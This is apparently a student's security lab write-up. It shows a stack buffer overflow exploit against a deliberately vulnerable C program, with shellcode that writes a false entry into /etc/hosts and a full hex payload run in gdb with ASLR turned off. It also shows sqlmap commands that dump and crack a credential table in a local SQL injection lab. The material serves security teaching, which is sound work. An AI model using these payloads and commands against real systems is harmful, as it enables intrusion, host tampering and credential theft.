# Lab #1,22110017, Tran Minh Duy, INSE330380E_02FIE
# Task 1: Software buffer overflow attack
Given a vulnerable C program 
```
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```
and a shellcode source in asm. This shellcode add a new entry in hosts file
```
global _start

section .text

_start:
    xor ecx, ecx
    mul ecx
    mov al, 0x5     
    push ecx
    push 0x7374736f     ;/etc///hosts
    push 0x682f2f2f
    push 0x6374652f
    mov ebx, esp
    mov cx, 0x401       ;permmisions
    int 0x80            ;syscall to open file

    xchg eax, ebx
    push 0x4
    pop eax
    jmp short _load_data    ;jmp-call-pop technique to load the map

_write:
    pop ecx
    push 20             ;length of the string, dont forget to modify if changes the map
    pop edx
    int 0x80            ;syscall to write in the file

    push 0x6
    pop eax
    int 0x80            ;syscall to close the file

    push 0x1
    pop eax
    int 0x80            ;syscall to exit

_load_data:
    call _write
    google db "127.1.1.1 google.com"
```
**Question 1**:
- Compile asm program and C program to executable code. 
- Conduct the attack so that when C executable code runs, shellcode will be triggered and a new entry is  added to the /etc/hosts file on your linux. 
  You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.

**Answer 1**:

### 1. Build image Run Docker
```
docker build -t img4lab .
```
```
 docker run -it --privileged -v C:/Users/Lenovo/Seclabs:/home/seed/seclabs img4lab
```
![image-13](https://github.com/user-attachments/assets/72669985-093b-4644-845b-ed995555f6f6)

### 2. Create and Compile c program and asm program
-Create c program and asm program.
![image-1](https://github.com/user-attachments/assets/60fec9bc-ac48-445c-b6da-428c2aa301c0)


-Compile them:
```
nasm -f elf32 -o lab1.o lab1.asm
```
```
ld -m elf_i386 -o lab1 lab1.o
```
```
gcc -o vullab1 vullab1.c -fno-stack-protector -z execstack -m32
```
![image](https://github.com/user-attachments/assets/8b3f6507-3c18-49ab-8569-0172d37cbe0d)

The image below shows that we compile c program and asm program successfully.
![image-14](https://github.com/user-attachments/assets/f56c5f4d-dff1-474f-972d-d66e88e76751)

![image-15](https://github.com/user-attachments/assets/ae52e5b7-24fb-4a34-b687-bf6d9290cc7a)


### 3. Stack Frame:
![image-4](https://github.com/user-attachments/assets/44016534-b1ff-4897-a920-b5de46cdabcd)


If we want to exploit 
- Overflow the Buffer.

The buffer is 16 bytes to send more than 16 bytes to overflow it.<br>
- Overwrite EBP (4 bytes).

The next 4 bytes would overwrite the saved EBP.<br>
- Overwrite Return Address (4 bytes).

To overwrite the return address to point to  the address of system() for a return-to-libc attack.<br>
- 4 bytes for argument for system()
### 4. Conduct the attack so that when C executable code runs, shellcode will be triggered and a new entry is added to the /etc/hosts file on your linux.
To exploit the **vullab1**, we need to  extract the shellcode from the compiled **lab1** binary and convert it into a hexadecimal string that we can use to inject into the **vullab1** C program.

```
 for i in $(objdump -d lab1 |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
```

![image-16](https://github.com/user-attachments/assets/ffae0439-b324-44cf-92ef-841caf7371c9)

- Disables Address Space Layout Randomization (ASLR):
```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
![image-17](https://github.com/user-attachments/assets/15fc3e5e-2c34-45fd-843e-43d4c309fffb)


- Start gdb with the Vulnerable Program:
```
gdb ./vullab1
```
- Run the Program with Your Payload:
```
run $(python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 20 + b"\x90" * 100 + b"\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x6f\x73\x74\x73\x68\x2f\x2f\x2f\x68\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\x01\x04\xcd\x80\x93\x6a\x04\x58\xeb\x10\x59\x6a\x14\x5a\xcd\x80\x6a\x06\x58\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xeb\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d")')
```
![image-21](https://github.com/user-attachments/assets/b17d6ac5-1edf-46ea-ab2f-1a27f8792f38)

- Set a breakpoint at strcpy:
```
break strcpy
```
- Run the program with an input of "A"s:
```
run $(python3 -c 'print("A" * 20)')

```
![image-22](https://github.com/user-attachments/assets/902ff147-320a-4bfd-b710-29e5a5d32d96)

- Examine the Stack and Registers After Hitting strcpy

You should examine the stack and registers at this point to confirm where your input is being placed.
```
info registers
x/40x $esp
```

![image-23](https://github.com/user-attachments/assets/f26c74aa-7607-4f33-894a-cae56633f12a)

Check the /etc/hosts file to confirm:
![image](https://github.com/user-attachments/assets/b3c8ae0b-8109-468d-a879-8f2efee9f447)

# Task 2: Attack on the database of Vulnerable App from SQLi lab 

- Start docker container from SQLi. 
- Install sqlmap.
- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup. 

**Set up lab**
```
docker compose up -d
```
![image-5](https://github.com/user-attachments/assets/10a33739-0d66-4629-b423-fb316c9338b1)


- Install SQL map
```
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

- Access the login page SQLi LAB: http://localhost:3128/

- Login this page:
```
username: admin
password: seedadmin
```
**Question 1**: Use sqlmap to get information about all available databases
**Answer 1**:
```
python sqlmap.py -u "http://localhost:3128/unsafe_home.php?username=admin&Password=seedadmin" --dbs
```
![image-6](https://github.com/user-attachments/assets/2a4ea2ae-7f91-4760-b969-6557f73622e4)

![image-7](https://github.com/user-attachments/assets/a03889a8-df87-4b84-a1d9-2aedd93575ad)


Sqlmap has successfully listed the databases. Two databases are available:

 - **information_schema**: This is a standard system database in MySQL, containing metadata about the database itself.

 - **sqllab_users**: This appears to be a custom database, likely containing user information or other relevant data.

**Question 2**: Use sqlmap to get tables, users information

**Answer 2**:
Retrieve and list all the tables present in the **information_schema** database:
```
python sqlmap.py -u "http://localhost:3128/unsafe_home.php?username=admin&Password=seedadmin" -D information_schema --tables
```
![image-9](https://github.com/user-attachments/assets/c479a213-52e7-488b-976c-585cab848369)

![image-8](https://github.com/user-attachments/assets/90b2fe2d-21fd-4326-9046-a8be95f52e46)

![image-13](https://github.com/user-attachments/assets/a7297aca-e492-455d-ae3b-bd5c6e1a55ea)


The result shows that there are 79 tables within the **information_schema** database.

**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit

**Answer 3**:
```
 python sqlmap.py -u "http://localhost:3128/unsafe_home.php?username=admin&Password=seedadmin" -D sqllab_users -T credential --dump
```
**Choose option 1**

![image-10](https://github.com/user-attachments/assets/6f68861c-ecaa-4bbf-88cd-0baf9cb371a5)

![image-11](https://github.com/user-attachments/assets/bab323ca-2b80-45c2-aa3a-1c030f61fa3f)


SQLmap is trying to crack hashed passwords (likely retrieved from the credential table) using a dictionary-based attack.

The cracking process starts, and we can see it using several common suffixes ('1', '123', '12', etc.) to test combinations of potential passwords.
SQLmap is running 8 parallel processes to speed up the dictionary attack.

The image below shows the result of dumping the credential table from the sqllab_users database using SQLmap.
![image-12](https://github.com/user-attachments/assets/1d974049-1ce8-4f59-a6fb-e2cf5fd9d1e3)
